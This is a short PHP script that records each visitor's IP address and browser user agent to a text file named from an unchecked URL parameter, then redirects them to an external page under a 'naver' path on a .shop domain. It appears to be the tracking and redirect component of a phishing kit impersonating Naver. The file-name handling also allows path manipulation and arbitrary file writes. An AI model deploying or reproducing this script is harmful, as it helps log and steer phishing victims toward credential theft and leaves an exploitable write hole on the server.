<?php 
	
	$ip = getenv ("REMOTE_ADDR");
	$date=date("F j, Y, g:i a");
	$ecoded_id=$_GET['menu'];
	$fname = sprintf("%s.txt",$ecoded_id);
	$handle = fopen($fname, "a+");
	fwrite($handle, $_SERVER['HTTP_USER_AGENT']);
	fwrite($handle, "\r\n");
	fwrite($handle, $ip);
	fwrite($handle, "\r\n");
	fwrite($handle, "-----------------------");
	fclose($handle);
	
	
	header('Location: https://plutg.shop/naver/jams.html');
	
?>